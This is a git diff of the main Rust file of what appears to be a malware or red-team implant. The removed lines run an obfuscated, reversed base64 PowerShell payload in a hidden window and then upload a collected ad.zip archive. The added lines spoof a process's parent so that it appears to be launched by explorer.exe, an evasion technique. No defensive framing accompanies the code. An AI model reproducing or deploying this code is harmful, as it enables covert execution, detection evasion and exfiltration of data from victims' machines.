@@ -1,11 +1,11 @@
-#![windows_subsystem = "windows"]
+//#![windows_subsystem = "windows"]
 
 //not find better for now :)
 #![allow(unused_imports)]
 #![allow(dead_code)]
 
 mod upload;
-mod escape;
+//mod escape;
 mod tools;
 mod persistance;
 
@@ -15,17 +15,63 @@ use std::io::Read;
 use std::string::String;
 use std::io::Write;
 
+
+use std::mem;
+use std::ptr::null_mut;
+use winapi::ctypes::c_void;
+use winapi::shared::basetsd::SIZE_T;
+use winapi::um::heapapi::{GetProcessHeap, HeapAlloc};
+use winapi::um::processthreadsapi::{
+    CreateProcessA, InitializeProcThreadAttributeList, OpenProcess, UpdateProcThreadAttribute,PROCESS_INFORMATION,
+};
+use winapi::um::winbase::STARTUPINFOEXA;
+use winapi::um::winnt::{HANDLE, LPSTR};
+
+use sysinfo::{PidExt,Pid, ProcessExt, System, SystemExt};
+
 fn main() {
 
-    let dropzone = r"C:\Users\Public\Downloads\";
+    let mut my_ppid = std::process::id();
+    println!("my pid : {}",my_ppid);
+    let s = System::new_all();
+    for process in s.processes_by_exact_name("explorer.exe") {
+        my_ppid = process.pid().as_u32();
+        println!("{} {}", process.pid(), process.name());
+    }
+    println!("my pid : {}",my_ppid);
 
-    let pws_b64 = String::from("=AgCA0AA0BAeAQHAuAgKA8FAkBQYAACAlBAZAUHAsBwYA4GAJBQLAACAqAAIA0GAlBAdAkEAtAQZAYHAvBQbAUGASBgCA0AAwBQaAoHAuAAZAEGAgAAaAQHAhBAUA4GAvBQaAQHAhBgbAkGA0BwcAUGAEBQLAACA0BAeAQHAuAgKAACAoBAdAEGAQBQLAACAlBgdAkGAoBwYAIHABBQLAMHAzBQZAIHAwBQbA8GADBgCA0AAKAQDAQHA4BAdA4CA0BwcAUHAyBAdA8FAkBQYAACAlBAbAkGAGBQLAQHA1BwTAACA8BgKAACAyBQZAQHAsBQaAYEAtAAIAQHAzBQdAIHAUBARAEEAtAAdAUGAHBgCA0AA0BAeAQHAuAAdAUGAuBgYAUHAzBwXAQGAhBAIAUGAsBQaAYEAtAAdAUHAPBAIAwHAgAgKAACAyBQZAQHAsBQaAYEAtAAIAQHAlBgbAIGA1BwUA4GAvBQaAQHAhBwYAkGAsBAcAUGASBARAEEAtAAdAUGAHBgCA0AA0BAeAQHAuAQdA8GAfBAZAEGAgAQZAwGApBgRA0CA0BQdA8EAgAAfAACAqAAIAIHAlBAdAwGApBgRA0CAgAAdAkGAuBQVAwGAhBgbA8GApBAdAEGA6BQaA4GAhBwZAIHAPBARAEEAtAAdAUGAHBgCA0AA0BAeAQHAuAAcAUHAvBgcAcGAfBAZAEGAgAQZAwGApBgRA0CA0BQdA8EAgAAfAACAqAAIAIHAlBAdAwGApBgRA0CAgAAcAUHAvBgcAcEAEBQQA0CA0BQZAcEAKAQDAQHA4BAdA4CAyBQZAMHA1BwXAQGAhBAIAUGAsBQaAYEAtAAdAUHAPBAIAwHAgAgKAACAyBQZAQHAsBQaAYEAtAAIAIHAlBwcAUFAEBQQA0CA0BQZAcEAKAQDAQHA4BAdA4CAyBQZAQHA1BAcA0GAvBwYA8FAkBQYAACAlBAbAkGAGBQLAQHA1BwTAACA8BAIAoCAgAgcAUGA0BAbAkGAGBQLAACAyBQZAQHA1BAcA0GAvBwQAQEABBQLAQHAlBwRAoAANAgCA0AA5BgcA8GA0BwYAUGAyBQaAQEAlBgdAkGA0BwYAEEAtAAdAIHAvBAcA0GAJBgCA0AApAwJAEDAzBAcA4CA5BgcA8GA0BwYAUGAyBQaAQEAlBgdAkGA0BwYAEEAtAAdAIHAvBAcA0GAJBwLAIHAlBAdAMHAhBQbA8CAlBAbAUHAkBwbA0EAEBQQA8CArBwbAgGAzBQYAQHAhBgcA0GAhBwcA8CAtBwbAMGAuAAdA4GAlBAdA4GAvBwYAIHAlBwcAUHAiBQdAgGA0BQaAcGAuAwdAEGAyBwLA8CA6AwcAAHA0BAdAgGAnAAKAcGAuBQaAIHA0BwUAQGAhBwbAwGAuBwdA8GAEBgLAkCA0BgbAUGApBAbAMEAiBQZAcFAuAAdAUGAOBAIAQHAjBQZAoGAiBwTA0CA3BQZA4GAoAAIAgHAlBQaAoAANAgKA4CAqAAZAEGAgAQZAQGA1BAbAMGAuBQSA0CAgAgKAACAtBQZAQHAJBQLAUGA2BwbA0GAlBgU");
-    let rever_b64: String = pws_b64.chars().rev().collect();
-    let pws_cmd = format!("-window hidden -enc {}",rever_b64);
-
-    tools::run_exe("powershell", &pws_cmd,Some(dropzone));
-        
-    upload::io_file("C:\\Users\\Public\\Downloads\\ad.zip");
+    let mut attrsize: SIZE_T = Default::default();
+    let mut pi = PROCESS_INFORMATION::default();
+    let mut si = STARTUPINFOEXA::default();
+    unsafe {
+        let mut openproc: HANDLE = OpenProcess(0x02000000, 0, my_ppid); //PPID
+    
+        InitializeProcThreadAttributeList(null_mut(), 1, 0, &mut attrsize);
+        si.lpAttributeList = HeapAlloc(GetProcessHeap(), 0, attrsize) as _;
+        InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &mut attrsize);
+        UpdateProcThreadAttribute(
+            si.lpAttributeList,
+            0,
+            0 | 0x00020000,
+            (&mut openproc) as *mut *mut c_void as *mut c_void,
+            mem::size_of::<HANDLE>(),
+            null_mut(),
+            null_mut(),
+        );
+        si.StartupInfo.cb = mem::size_of::<STARTUPINFOEXA>() as u32;
+        CreateProcessA(
+            null_mut(),
+            "C:\\temp\\pestudio\\pestudio.exe\0".as_ptr() as LPSTR,
+            null_mut(),
+            null_mut(),
+            0,
+            0x00080000,
+            null_mut(),
+            null_mut(),
+            &mut si.StartupInfo,
+            &mut pi,
+        );
+    }
 
 }
 
